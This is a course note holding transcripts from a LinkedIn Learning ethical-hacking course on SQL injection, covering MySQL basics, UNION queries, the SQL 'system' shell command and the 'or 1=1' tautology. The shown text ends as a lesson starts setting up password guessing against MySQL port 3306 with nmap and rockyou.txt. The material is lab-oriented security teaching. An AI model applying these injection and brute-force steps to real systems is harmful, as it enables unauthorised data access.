---
type: course
cssclasses:
  - lle-course
  - lle-level-intermediate
slug: ethical-hacking-sql-injection
url: "https://www.linkedin.com/learning/ethical-hacking-sql-injection"
duration_minutes: 105
duration: 1h 45m
level: Intermediate
updated: 5/10/2023
learners: 43834
skills:
  - SQL Injection
  - Ethical Hacking
exercise_files: true
thumbnail: "https://media.licdn.com/dms/image/v2/C4D0DAQFjzkwOhEHRkA/learning-public-crop_675_1200/learning-public-crop_675_1200/0/1635179468495?e=2147483647&amp;v=beta&amp;t=wjDhneIXwCuOs1LgVGK-b9o8Bi8_ZTxQ06gni-AZMSU"
linkedin_topic: Cybersecurity
learning_paths:
  - '[[Become an Ethical Hacker]]'
prev_courses:
  - '[[Ethical Hacking- Cloud Computing]]'
path_nav: '[{"path":"Become an Ethical Hacker","position":19,"total":19,"prev":"Ethical Hacking- Cloud Computing","next":null}]'
path_count: 1
tags:
  - course
  - topic/security
  - topic/network-and-system-administration
  - skill/sql-injection
  - skill/ethical-hacking
status: not-started
created: 2026-05-02
---

> <!-- lle:github-source --> [View this note on GitHub](https://github.com/thisis-romar/linkedin-learning-vault/blob/github-browse/Courses/Cybersecurity/Ethical%20Hacking-%20SQL%20Injection.md)

![Ethical Hacking: SQL Injection](https://media.licdn.com/dms/image/v2/C4D0DAQFjzkwOhEHRkA/learning-public-crop_675_1200/learning-public-crop_675_1200/0/1635179468495?e=2147483647&amp;v=beta&amp;t=wjDhneIXwCuOs1LgVGK-b9o8Bi8_ZTxQ06gni-AZMSU)

# Ethical Hacking: SQL Injection

> SQL injections are a common way to gain unauthorized access to web applications and extract data from them. In this course, instructor Malcolm Shore shows you the SQL command language and how it is used by attackers to craft SQL Injections. Malcolm begins with commonly encountered relational databases and the basics of the SQL command language. Then he focuses on advanced SQL commands that may be 

> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-sql-injection) | 1h 45m | Intermediate | 44K learners
> [Jump to Path Context ↓](#path-context)

## Table of Contents

### Chapter Overview

- [**Introduction**](#introduction) (3 videos)
  - [Understanding how SQL injections work](#understanding-how-sql-injections-work)
  - [What you should know](#what-you-should-know)
  - [Disclaimer](#disclaimer)
- [**1. SQL Basics**](#1-sql-basics) (4 videos)
  - [Starting with SQL](#starting-with-sql)
  - [Creating a MySQL database](#creating-a-mysql-database)
  - [Using SQL](#using-sql)
  - [Finding the SQL password](#finding-the-sql-password)
- [**2. Testing for SQL Injections**](#2-testing-for-sql-injections) (6 videos)
  - [Checking out the Security Shepherd](#checking-out-the-security-shepherd)
  - [Injecting Mutillidae](#injecting-mutillidae)
  - [Deep diving the target with SQLi](#deep-diving-the-target-with-sqli)
  - [Cracking the MySQL hash](#cracking-the-mysql-hash)
  - [Injecting Microsoft SQL Server](#injecting-microsoft-sql-server)
  - [Injecting Oracle SQL Server](#injecting-oracle-sql-server)
- [**3. Automating SQL Injection Exploits**](#3-automating-sql-injection-exploits) (10 videos)
  - [Inferring TRUE when blind](#inferring-true-when-blind)
  - [Using prepared SQL queries](#using-prepared-sql-queries)
  - [Getting our first sqlmap injection](#getting-our-first-sqlmap-injection)
  - [Sanitizing input to SQL](#sanitizing-input-to-sql)
  - [Inserting an SQL injection via Burp Suite](#inserting-an-sql-injection-via-burp-suite)
  - [Following up with a second injection](#following-up-with-a-second-injection)
  - [Defeating the WAF](#defeating-the-waf)
  - [Navigating a complex injection](#navigating-a-complex-injection)
  - [Using request messages to inject SQL](#using-request-messages-to-inject-sql)
  - [Checking out SQLI Labs](#checking-out-sqli-labs)
- [**Conclusion**](#conclusion) (1 videos)
  - [What's next?](#whats-next)

### Introduction

[↑ Back to Table of Contents](#table-of-contents)

#### Understanding how SQL injections work
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-sql-injection/understanding-how-sql-injections-work?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/understanding-how-sql-injections-work?u=76281980&t=0)** - With the dominance of cloud and software as a service delivery web portals are now the dominant means of accessing applications and are often supported by a backend SQL server.
>
> **[0:11](https://www.linkedin.com/learning/ethical-hacking-sql-injection/understanding-how-sql-injections-work?u=76281980&t=11)** With the prevalence of SQL, adversaries will look for every opportunity to take advantage of unprotected SQL based applications to gain access to our information and systems.
>
> **[0:21](https://www.linkedin.com/learning/ethical-hacking-sql-injection/understanding-how-sql-injections-work?u=76281980&t=21)** We need to protect our systems and that means understanding the basics of the SQL language and understanding how it can be used to penetrate our systems.
>
> **[0:31](https://www.linkedin.com/learning/ethical-hacking-sql-injection/understanding-how-sql-injections-work?u=76281980&t=31)** I'm Malcolm Shore and I've spent a career helping governments and businesses protect their systems.
>
> **[0:37](https://www.linkedin.com/learning/ethical-hacking-sql-injection/understanding-how-sql-injections-work?u=76281980&t=37)** I'd like to invite you to take this course and learn how SQL injections work.
>
> **[0:42](https://www.linkedin.com/learning/ethical-hacking-sql-injection/understanding-how-sql-injections-work?u=76281980&t=42)** Now let's get started with SQL injections.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[SQL]] (5), cloud (1), [[SaaS|Software as a service]] (1), web (1), [[Microsoft SQL Server|Sql server]] (1)
> **Env Vars:** sql (6)
> **Speakers:** - with (1)

#### What you should know
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-sql-injection/what-you-should-know?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/what-you-should-know?u=76281980&t=0)** - [Instructor] This is a practical course and we'll be using Kali Linux-based tools to do testing, and we'll be using targets in the Offensive Security and Hack The Box online penetration testing labs.
>
> **[0:12](https://www.linkedin.com/learning/ethical-hacking-sql-injection/what-you-should-know?u=76281980&t=12)** Where possible, I'll use the free subscription targets in these labs.
>
> **[0:16](https://www.linkedin.com/learning/ethical-hacking-sql-injection/what-you-should-know?u=76281980&t=16)** But some of the more complex targets will be in the main labs.
>
> **[0:19](https://www.linkedin.com/learning/ethical-hacking-sql-injection/what-you-should-know?u=76281980&t=19)** You should be competent in Windows and Unix host technologies.
>
> **[0:23](https://www.linkedin.com/learning/ethical-hacking-sql-injection/what-you-should-know?u=76281980&t=23)** A good understanding of HTTP and the SQL language would be an advantage.
>
> **[0:28](https://www.linkedin.com/learning/ethical-hacking-sql-injection/what-you-should-know?u=76281980&t=28)** You'll need to have a good working knowledge of Kali and some hands-on experience of testing.
>
> **[0:34](https://www.linkedin.com/learning/ethical-hacking-sql-injection/what-you-should-know?u=76281980&t=34)** You should have a working knowledge of web testing tools, and you should have taken the Ethical Hacking: Web Servers and Applications course.
>
> **[0:42](https://www.linkedin.com/learning/ethical-hacking-sql-injection/what-you-should-know?u=76281980&t=42)** And if you've taken the Advanced Web Testing course, that would be an advantage.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** web (3), [[Kali Linux]] (1), [[Security]] (1), [[Penetration Testing]] (1), [[Windows]] (1)
> **Env Vars:** http (1), sql (1)
> **Definitions:** is a  (1)
> **Prerequisites:** you'll need (1)
> **Speakers:** - [instructor] (1)

#### Disclaimer
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-sql-injection/disclaimer?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/disclaimer?u=76281980&t=0)** - [Instructor] This is one of a series of advanced penetration testing courses.
>
> **[0:04](https://www.linkedin.com/learning/ethical-hacking-sql-injection/disclaimer?u=76281980&t=4)** And in addition to Kali Linux, it uses some third-party testing software.
>
> **[0:09](https://www.linkedin.com/learning/ethical-hacking-sql-injection/disclaimer?u=76281980&t=9)** While we've done our best to ensure that the tools we use and the sites we reference are legitimate, testing sites can be targets for hackers and we can't provide any assurance that these sites might not be compromised when you visit them.
>
> **[0:22](https://www.linkedin.com/learning/ethical-hacking-sql-injection/disclaimer?u=76281980&t=22)** Some of the sites which store the testing tools are detected as dangerous because the tools have similar signatures to malware and may raise antivirus alerts when you visit them.
>
> **[0:32](https://www.linkedin.com/learning/ethical-hacking-sql-injection/disclaimer?u=76281980&t=32)** The testing tools we use are extremely powerful.
>
> **[0:35](https://www.linkedin.com/learning/ethical-hacking-sql-injection/disclaimer?u=76281980&t=35)** They may demonstrate some of the same signature characteristics as malware and malicious implants and may raise antivirus alerts when you try to download them.
>
> **[0:44](https://www.linkedin.com/learning/ethical-hacking-sql-injection/disclaimer?u=76281980&t=44)** Again, we can't provide assurance that the software hasn't been compromised when you download it.
>
> **[0:50](https://www.linkedin.com/learning/ethical-hacking-sql-injection/disclaimer?u=76281980&t=50)** And so as for any other software from the internet, you need to exercise due diligence and take personal responsibility for anything you load into your system.
>
> **[0:58](https://www.linkedin.com/learning/ethical-hacking-sql-injection/disclaimer?u=76281980&t=58)** The testing we do is mostly carried out inside a virtual environment to contain any unplanned effects of testing tools.
>
> **[1:05](https://www.linkedin.com/learning/ethical-hacking-sql-injection/disclaimer?u=76281980&t=65)** And in the unlikely event that you do download malware, this will also help contain any impact.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Penetration Testing]] (1), [[Kali Linux]] (1)
> **Speakers:** - [instructor] (1)


### 1. SQL Basics

[↑ Back to Table of Contents](#table-of-contents)

#### Starting with SQL
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=0)** - [Instructor] In the early days of computing, we wrote applications which managed data records.
>
> **[0:05](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=5)** The applications were typically written in COBOL, and the records were in an index sequential or ISAM file.
>
> **[0:12](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=12)** There's still many of these applications around today in government and industry.
>
> **[0:16](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=16)** However, times moved on, and in the 1980s, a new form of data management emerged, called relational databases.
>
> **[0:23](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=23)** Relational databases consists of data held in records, as they were in ISAM, but designed in such a way as to have relational links between fields in one part of the database and key identification fields in another.
>
> **[0:37](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=37)** This meant that instead of repeating, for instance, Buoy in the town field, we could have a separate area of towns with Buoy, been represented by say 2-0-7-1-5 and its record containing all the relevant town attributes in relational database terminology.
>
> **[0:54](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=54)** We call these separate parts of the database tables.
>
> **[0:58](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=58)** Then whenever we need to have Buoy in a record, we can just reference it as 2-0-7-1-5 and look it up in the towns table when we need further details.
>
> **[1:07](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=67)** There's a fair bit of theory around design of relational databases, but we won't be covering that in this course.
>
> **[1:13](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=73)** In order to understand SQL, we need to get hands-on.
>
> **[1:16](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=76)** So let's jump straight into it and start using SQL.
>
> **[1:20](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=80)** Carly comes with the MySQL server already loaded, so all we need to do is start it.
>
> **[1:25](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=85)** We can do that by entering the command, service, MySQL, start, and we'll enter our root password.
>
> **[1:36](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=96)** Now the service is started we can use the interactive client by entering, pseudo, MySQL
>
> **[1:45](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=105)** - U, root.
>
> **[1:47](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=107)** Okay we now have an SQL prompt and it's showing we using Maria DB.
>
> **[1:51](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=111)** To be accurate Maria DB isn't MySQL, but it is a variant that's evolved from MySQL and for all intents and purposes they're the same.
>
> **[2:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=120)** We're in SQL now, so let's see what databases we can connect to.
>
> **[2:04](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=124)** We use the show database command for that and terminate it with a semi-colon.
>
> **[2:09](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=129)** Show, databases.
>
> **[2:13](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=133)** And we can see, we have the information schema, MySQL, and performance schema databases.
>
> **[2:19](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=139)** Let's explore these, firstly we'll connect to information schema.
>
> **[2:23](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=143)** We do that by saying use, information, schema, and we can list the tables in this database by saying show, tables.
>
> **[2:39](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=159)** We can see there's quite a lot of tables here.
>
> **[2:41](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=161)** Let's take a look at one of them with the command, select, star, from INODB, SYS, tables, and we've listed the full record, but we could just list the table on ID by saying, select, table, ID, comma, name, from INODB, SYS, tables.
>
> **[3:19](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=199)** The fields and command words aren't case sensitive, but we'll often see command words in capitals by convention.
>
> **[3:26](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=206)** Let's take a look at the, MySQL database.
>
> **[3:30](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=210)** Use MySQL, show, tables.
>
> **[3:40](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=220)** We've got a few tables here also including one called user.
>
> **[3:44](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=224)** Let's check what data fields are in the table.
>
> **[3:48](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=228)** Show, columns, from, user.
>
> **[3:56](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=236)** And we've got a few columns as well, including, two fields called user and password, let's list them.
>
> **[4:08](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=248)** Select, user, comma, password, from, user, and we can see just the root user with a blank password.
>
> **[4:21](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=261)** Let's now create a user account called Marcus.
>
> **[4:24](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=264)** We can do that with the grant statement and we'll set the password to Marcus also.
>
> **[4:30](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=270)** Grant, all, privileges, on startup star, to, Marcus, at, local host, identified, by, Marcus.
>
> **[4:57](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=297)** And now when we list the users, we can see we have the root user and also the Marcus account with its password hash.
>
> **[5:06](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=306)** Okay. We've made a good start on using my SQL.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[MySQL]] (8), database (6), [[SQL]] (5), data (4), [[Relational Databases]] (3)
> **Env Vars:** sql (5), isam (2), inodb (2), sys (2), cobol (1)
> **CLI Commands:** mysql (8)
> **Speakers:** - [instructor] (1), - u (1)
> **Definitions:** is a  (1)
> **Analogies:** for instance (1)

#### Creating a MySQL database
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=0)** - Let's now log into my SQL as our new user Marcus and create a database to use for this course.
>
> **[0:08](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=8)** My SQL minus you Marcus minus P and then to our password which is also Marcus.
>
> **[0:17](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=17)** And we're now in my SQL as the user Marcus.
>
> **[0:20](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=20)** We'll create a new database.
>
> **[0:23](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=23)** Create database called cleo.
>
> **[0:29](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=29)** And then we'll make it our current database.
>
> **[0:33](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=33)** Use Cleo and we'll list the tables.
>
> **[0:37](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=37)** Show tables.
>
> **[0:41](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=41)** And we see it's an empty set because we haven't created any tables in this database yet.
>
> **[0:45](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=45)** Let's build the tables next.
>
> **[0:47](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=47)** We want our database to consist of three tables.
>
> **[0:50](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=50)** One containing the basic details of Egyptian Pharaohs.
>
> **[0:53](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=53)** The second of the dynastic seat of power during the Pharaohs reign and the third the tomb where the Pharaoh was found.
>
> **[1:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=60)** So let's create table Pharaoh and we'll put in columns, Pharaoh ID, which is an INT, name, which is a VARcharacter, variable character of length 32, reign start, which is an INT, reign, end which is an INT.
>
> **[1:34](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=94)** The dynasty, which is an INT and the tomb, which is again, a variable character field of length hates in this case.
>
> **[1:43](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=103)** Okay.
>
> **[1:44](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=104)** And we'll create our table.
>
> **[1:50](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=110)** Dynasty and we'll put in the fields.
>
> **[1:53](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=113)** Dynasty ID which is an INT.
>
> **[1:58](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=118)** The seat of power, which is a VARchar 20 and commentary, which is a VARchar 64.
>
> **[2:12](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=132)** And finally we'll create table tomb which is tomb ID VARchar eight and again the commentary of VARchar 64.
>
> **[2:35](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=155)** We now need to load the tables which we can do by using the files in your exercise folder.
>
> **[2:40](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=160)** These are common delimited files containing the database information.
>
> **[2:44](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=164)** We can see here, the Pharaoh dot text file.
>
> **[2:48](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=168)** Okay so we load those files by saying load data local Infile Pharaoh dot text into table Cleo dot Pharaoh Fields terminated by quote comma quote and semi-colon.
>
> **[3:20](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=200)** And that's loaded.
>
> **[3:21](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=201)** And we do the same load data local Infile dynasty dot text into table Cleo dot dynasty fields terminated by comma and finally load data local Infile tomb block text into table
>
> **[4:09](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=249)** Cleo dot tomb fields terminated by comma.
>
> **[4:21](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=261)** Okay we've now got our database set up.
>
> **[4:24](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=264)** Just before we go, let's look at the contents of the tomb table.
>
> **[4:28](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=268)** Select star from tomb.
>
> **[4:35](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=275)** And get a formatted listing over the records in the tomb table.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** database (8), [[SQL]] (3), data (3), power (2), next (1)
> **Env Vars:** int (5), sql (3)
> **Definitions:** is an  (5), is a  (3)
> **CLI Commands:** make (1)
> **Prerequisites:** set up (1)
> **Speakers:** - let (1)

#### Using SQL
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=0)** - Now we've got our SQL database set up.
>
> **[0:02](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=2)** Let's see how we use it.
>
> **[0:04](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=4)** We've already seen how to list all records in a database.
>
> **[0:07](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=7)** Let's see how we select just a subset of the table.
>
> **[0:11](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=11)** Select star from Pharaoh, where the dynasty equals 23.
>
> **[0:25](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=25)** And we get just those pharaohs who ruled in the 23rd dynasty.
>
> **[0:29](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=29)** We can look at partial matches using the percent sign.
>
> **[0:33](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=33)** Select star from Pharaoh, where name like Shoshenq, percent.
>
> **[0:54](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=54)** And we get Shoshenq one to five.
>
> **[0:57](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=57)** We can change a field by using the update command.
>
> **[1:01](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=61)** Update, Pharaoh set dynasty equals zero, where name equals Shoshenq three.
>
> **[1:22](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=82)** Let's look at the Shoshenq family again, and we can see Shoshenq three has a zero dynasty value.
>
> **[1:30](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=90)** Let's set that back to what it was originally.
>
> **[1:33](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=93)** Set dynasty equals 23, where name is Shoshenq the third.
>
> **[1:38](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=98)** We can also add records using the insert verb ,and delete records using the delete verb.
>
> **[1:43](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=103)** And we can remove tables using the drop command.
>
> **[1:47](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=107)** I won't run these, but you can check them out yourself.
>
> **[1:49](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=109)** Another useful SQL command is the System command, which enables us to run Bash or Windows commands.
>
> **[1:56](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=116)** For instance, we can do a folder listing by saying system LS minus AL, and we get the folder listing.
>
> **[2:06](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=126)** The join verb allows us to connect the relevant table entry from a second table where we have a reference, for example, select star from Pharaoh in a join dynasty on Pharaoh dot dynasty equals dynasty dot did.
>
> **[2:44](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=164)** And we get an extended table which contains all columns.
>
> **[2:48](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=168)** We can combine that with our, where clause also.
>
> **[2:52](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=172)** Select with the inner join, where name like Shoshenq percent.
>
> **[3:05](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=185)** We don't have to return all columns.
>
> **[3:07](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=187)** We can specify what we want.
>
> **[3:09](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=189)** So instead of select star on our join, we can select Pharaoh ID, name, and seat from Pharaoh in a join dynasty on Pharaoh dot dynasty dot did where name is like Shoshenq.
>
> **[3:30](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=210)** There's another useful verb we can use called Union.
>
> **[3:33](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=213)** This combines multiple selects into a single output.
>
> **[3:38](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=218)** Select phid comma name from Pharaoh where name like Shoshenq.
>
> **[4:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=240)** Union select again, phid comma name from Pharaoh.
>
> **[4:10](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=250)** Where name like Ptolemy.
>
> **[4:20](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=260)** And we get the Shoshenq and Ptolemy families.
>
> **[4:23](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=263)** The union verb is normally used to combine two separate tables.
>
> **[4:27](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=267)** We can use logical operators.
>
> **[4:29](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=269)** Let's do our selective of the Shoshenqs again.
>
> **[4:33](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=273)** Select star from Pharaoh where name like Shoshenq.
>
> **[4:52](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=292)** Now let's do that again with an or statement, select star from Pharaoh, where name like Shoshenq or one equals one.
>
> **[5:03](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=303)** And we get the whole table.
>
> **[5:05](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=305)** This is because one always equals one.
>
> **[5:07](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=307)** We can also use the expression True.
>
> **[5:13](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=313)** Select star from Pharaoh where name like Shoshenq percent or true.
>
> **[5:19](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=319)** And we get the full table again.
>
> **[5:21](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=321)** Okay, we've now got sufficient understanding of SQL to go do some SQL injection.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[SQL]] (4), database (2), [[Windows]] (1)
> **Env Vars:** sql (4)
> **Analogies:** for instance (1), for example (1)
> **CLI Commands:** ls (1)
> **Tools:** bash (1)
> **Prerequisites:** set up (1)
> **Speakers:** - now (1)

#### Finding the SQL password
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-sql-injection/finding-the-sql-password?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/finding-the-sql-password?u=76281980&t=0)** - [Narrator] Before we get into SQL injection proper.
>
> **[0:03](https://www.linkedin.com/learning/ethical-hacking-sql-injection/finding-the-sql-password?u=76281980&t=3)** Let's take a look at another way of accessing SQL databases.
>
> **[0:06](https://www.linkedin.com/learning/ethical-hacking-sql-injection/finding-the-sql-password?u=76281980&t=6)** If we have access to the service on port 3306, we can check that by running "nmap" on port 3306, and we can see it's open.
>
> **[0:16](https://www.linkedin.com/learning/ethical-hacking-sql-injection/finding-the-sql-password?u=76281980&t=16)** We'll use our local kali system on "127.0.0.1", but we could be doing the same attack on a remote server.
>
> **[0:24](https://www.linkedin.com/learning/ethical-hacking-sql-injection/finding-the-sql-password?u=76281980&t=24)** Let's assume we know there's a user called Marcus, and we may have got that from email.
>
> **[0:28](https://www.linkedin.com/learning/ethical-hacking-sql-injection/finding-the-sql-password?u=76281980&t=28)** We'll need a set of potential passwords, and we can use the standard kali "rockyou.txt".
>
